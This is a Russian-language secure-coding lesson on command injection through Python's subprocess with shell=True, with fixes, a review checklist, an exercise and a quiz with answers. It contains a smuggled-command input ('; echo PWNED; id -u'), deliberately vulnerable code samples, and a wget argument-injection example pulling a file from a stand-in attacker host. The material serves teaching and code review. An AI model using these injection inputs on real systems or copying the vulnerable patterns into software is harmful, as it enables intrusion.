# subprocess с shell=True: инъекции в командную строку

Уровень **L2** · время 35 мин (теория 20 / задача 10 / самопроверка 5,
оценка)

Что прочитать сначала: `os-command-injection`.

Сервис проверяет доступность хоста: имя приходит из формы, команда
собирается строкой. Прогоним один и тот же ввод двумя способами. Ввод:
`127.0.0.1; echo PWNED; id -u`.

```text
== shell=True, склейка строкой:
['PWNED', '1000']
== список аргументов, шелл не зовётся:
код 2 | stderr: ping: 127.0.0.1; echo PWNED; id -u: Name or service...
```

Первый прогон выполнил три команды: ping, потом echo, потом id — и
напечатал uid. Второй передал всю строку программе ping одним
аргументом, и ping честно сообщил, что такого хоста нет. Обратите
внимание, чего во втором случае не произошло: шелла в запуске не было
вовсе, и разбирать метасимволы оказалось некому.

Это языковая грань внедрения команд — сам класс дефекта разобран в теме
`os-command-injection`. Дальше разберём, когда Python зовёт шелл и когда
нет, чем инъекция аргумента отличается от инъекции команды и как вызов
чинится без потери функции.

## 0. Коротко

То же в терминах, которыми это обсуждают. По умолчанию subprocess шелл
не вызывает: каждый элемент списка доезжает до программы одним
аргументом, и метасимволы в нём остаются текстом. Флаг shell=True
передаёт строку интерпретатору /bin/sh, и тот разбирает её по своим
правилам: `;`, `&&`, `|` и подстановки становятся командами. Это CWE-78
(каталог Common Weakness Enumeration), категория `A05:2025` издания
OWASP. Чинится переходом на список аргументов без шелла; для
оставшихся аргументов из ввода добавляют валидацию и разделитель `--`.
Экранирование через shlex.quote — запасной вариант, а не основной.

**Зачем это в работе AppSec-инженера.** Вызов внешней команды
встречается в каждом втором сервисе: конвертеры документов, сборка
артефактов, работа с git. Признак дефекта виден в одной строке, и находка
почти всегда спорная: «у нас вход доверенный». Прогон из введения —
готовый ответ на этот спор: он занимает минуту и показывает обе стороны
границы.

## 3. Механика

**Откуда это взялось.** Запуск команды строкой — привычка из
шелл-скриптов: там строка и есть язык. В Python интерфейс унаследовал обе
формы, и унаследовал с ловушкой: самая короткая запись вызова строкой
требует shell=True, а значит, шелл-разбор приезжает вместе с ней. Раздел
Security Considerations в документации формулирует это прямо. Библиотека
сама шелл не зовёт, и любые символы безопасно передаются потомку
аргументами. А вот при явном shell=True экранировать пробелы и
метасимволы — обязанность приложения.

Модель на двух путях:

```text
run(["ping", "-c", "1", host])          -> exec(программа, аргументы)
run(f"ping -c 1 {host}", shell=True)    -> /bin/sh -c "ping -c 1 <ввод>"
```

В первом пути строка ввода целиком становится одним аргументом: никакой
разбор её не касается. Во втором пути ввод встречается с грамматикой
шелла, и точка и запятая в нём — оператор «выполни следующее». Заметим:
вредоносного ввода как отдельной сущности нет — есть строка, которую два
разных читателя читают по-разному.

Вторая половина механики тоньше. Даже без шелла ввод остаётся аргументом,
а аргумент, начинающийся с дефиса, программа читает как флаг. Памятка
OWASP называет это инъекцией аргумента: ввод `--help`, подставленный в
вызов curl, превращается в честный вызов `curl --help`. Прогон это
подтверждает: `ls`, получивший аргумент `--help`, печатает свою справку,
хотя ревьюер видел в коде только «вызов ls на файле». POSIX предписывает
разделитель `--`: всё после него — операнды, даже начинающиеся с дефиса.

## 5. Как выглядит в коде

Ревьюер ищет четыре формы.

```python
# УЯЗВИМО — демонстрация, не для продакшена
import os
import subprocess

subprocess.run(f"ping -c 1 {host}", shell=True)      # (1)
os.system(f"convert {src} {dst}")                    # (2)
subprocess.getoutput(f"git log {branch}")            # (3)
subprocess.run(["sh", "-c", f"tar cf {out} {src}"])  # (4)
```

1. Классическая форма: f-строка и shell=True в одном вызове.
2. os.system всегда идёт через шелл — флага тут нет и не нужен.
3. Обёртки getoutput и check_output со строкой — тот же шелл.
4. Явный `sh -c` со склейкой: shell=True, записанный руками.

Обёртка, которая выглядит защитой, — shlex.quote вокруг ввода. Она
действительно гасит метасимволы: прогон показывает, что ввод превращается
в `'127.0.0.1; echo PWNED; id -u'` в одиночных кавычках. Но гасит она
только разбор шелла. Аргумент-флаг она не лечит: значение `--output=/tmp/x`
в кавычках остаётся тем же флагом для программы, которая его получит.

Ложное срабатывание: вызов со списком и фиксированной командой, где ввод
проходит валидацию по образцу, — законен. Сомнительное место другое:
список, где чужая строка стоит аргументом без `--` перед ним, — уже
зависит от того, как читает аргументы конкретная программа.

## 6. Как чинится

Правило одно: команда фиксирована в коде, аргументы едут списком, шелл
не вызывается.

```python
# Исправлено
import subprocess

subprocess.run(["ping", "-c", "1", "--", host], check=True)
```

Памятка OWASP добавляет два слоя поверх. Первый: если без шелла никак —
конвейер, перенаправление, — ввод экранируется shlex.quote, а сама
команда выбирается из короткого списка разрешённых, а не из ввода.
Второй: аргументы из ввода валидируются по образцу (в памятке пример —
регулярное выражение на допустимые символы и длину), и это отдельная
проверка, а не замена списка. Разделитель `--` перед пользовательским
операндом закрывает инъекцию флага там, где программа его поддерживает.

**Когда канон не подходит.** Настоящий конвейер из двух программ без
шелла собирается из двух объектов Popen со связанными потоками — это
длиннее, но остаётся в первом пути. На Windows правила свои: пакетные
файлы операционная система запускает через интерпретатор независимо от
аргументов библиотеки, и документация предлагает там как раз shell=True.
Ревью кросс-платформенного кода обязано это учитывать (WSTG-v42-INPV-12
проверяет класс на обеих платформах).

## 9. Ловушка

Встречается мнение, что shlex.quote на входе закрывает вопрос целиком.

**Кавычки лечат разбор шелла и не лечат смысл аргумента.** Механизм из
раздела о механике: после экранирования ввод доезжает одним аргументом.
Но программа этот аргумент всё равно читает по своим правилам — и если
это флаг, она его исполнит.

Контрпример из памятки OWASP: `wget` с экранированным вводом
`--directory-prefix=. http://attacker.example/x` получает лишний
параметр целиком как флаг и сохраняет чужой файл куда указано. Кавычки
были на месте; инъекция команды не сработала; инъекция аргумента —
сработала.

## 10. Чеклист ревью

1. Verify that ни один вызов subprocess, os.system или getoutput не
   собирает команду строкой из внешних данных (CWE-78).
2. Verify that shell=True отсутствует или обоснован конвейером, а ввод
   в нём экранирован shlex.quote и валидирован по образцу.
3. Verify that имя программы зашито в код, а не приходит из запроса или
   конфигурации (ASVS v5.0-1.2.5).
4. Verify that перед пользовательским операндом стоит разделитель `--`
   там, где программа его поддерживает.
5. Verify that у каждого аргумента из ввода проверено, не читается ли он
   программой как флаг.
6. Verify that код, рассчитанный и на Windows, учитывает особый запуск
   пакетных файлов (WSTG-v42-INPV-12).

## 11. Задача

Найдите в своём питоновом проекте все вызовы subprocess, os.system,
getoutput и check_output. Один вызов со склейкой строки перепишите на
список аргументов. Прогоните обе версии на вводе с `;` и на вводе с
флагом, начинающимся с дефиса.

Одна подсказка: увидеть разницу проще всего через ошибку целевой
программы — без шелла она получит всю строку одним аргументом и скажет
об этом в stderr.

**Критерий выполнения** наблюдаемый: два вывода одного ввода. До
правки метасимволы исполнились; после правки весь ввод виден как один
аргумент. Для ввода с флагом записано, сработал он или нет.

## 12. Проверь себя

1. Что делает shell=True со строкой команды и кто разбирает в ней
   метасимволы?
2. Чем вызов со списком аргументов отвечает на ввод `a; id`?
3. Почему shlex.quote не защищает от ввода `--output=/tmp/x`?
4. Что даёт разделитель `--` и почему он не заменяет список аргументов?
5. Возврат к теме `os-command-injection`: назовите источник и сток
   дефекта в примере из введения этой темы.

<details markdown="1">
<summary>Ответы</summary>

1. Строка передаётся интерпретатору /bin/sh, и метасимволы разбирает он
   по правилам своего языка: `;`, `&&`, `|` — операторы команд.
2. Вся строка доезжает до программы одним аргументом; разбора нет,
   потому что шелла нет.
3. Кавычки убирают только разбор шелла. Аргумент, начинающийся с
   дефиса, программа прочитает как флаг независимо от кавычек.
4. После `--` программа обязана читать аргументы как операнды, а не как
   опции. Это защищает операнд, но не отменяет правило «команда
   фиксирована, аргументы списком».
5. Источник — поле формы с именем хоста, сток — вызов интерпретатора
   команд через shell=True. Между ними нет ни одного контроля.

</details>

Security Considerations и памятка OWASP открыты лично 2026-09-02.

по документации subprocess.
